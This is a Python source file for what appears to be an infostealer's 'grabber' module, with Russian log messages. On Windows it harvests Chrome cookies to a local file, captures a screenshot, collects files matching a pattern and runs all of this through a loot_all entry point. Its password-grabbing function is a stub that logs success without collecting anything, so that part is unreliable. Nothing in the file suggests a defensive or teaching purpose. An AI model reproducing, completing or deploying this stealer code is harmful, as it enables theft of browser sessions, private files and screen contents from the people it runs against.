import os
import platform
import glob
from utils.logger import log

def grab_passwords():
    if platform.system() == 'Windows':
        try:
            import browser_cookie3
            from Cryptodome.Cipher import AES
            cj = browser_cookie3.chrome()
            log('[Grabber] Пароли собраны')
        except Exception as e:
            log(f'[Grabber] Ошибка паролей: {e}')

def grab_cookies():
    if platform.system() == 'Windows':
        try:
            import browser_cookie3
            cj = browser_cookie3.chrome()
            with open('cookies.txt', 'w') as f:
                for cookie in cj:
                    f.write(str(cookie) + '\n')
            log('[Grabber] Куки сохранены')
        except Exception as e:
            log(f'[Grabber] Ошибка кук: {e}')

def grab_screenshot():
    try:
        import pyscreenshot
        img = pyscreenshot.grab()
        img.save('screenshot.png')
        log('[Grabber] Скриншот сделан')
    except Exception as e:
        log(f'[Grabber] Ошибка скриншота: {e}')

def grab_files(mask):
    found = []
    for f in glob.glob(mask, recursive=True):
        if os.path.isfile(f):
            found.append(f)
    log(f'[Grabber] Найдено {len(found)} файлов по маске {mask}')
    return found

def loot_all(mask=None):
    grab_passwords()
    grab_cookies()
    grab_screenshot()
    if mask:
        grab_files(mask)
    log('[Grabber] Сбор данных завершён')

if __name__ == '__main__':
    loot_all()
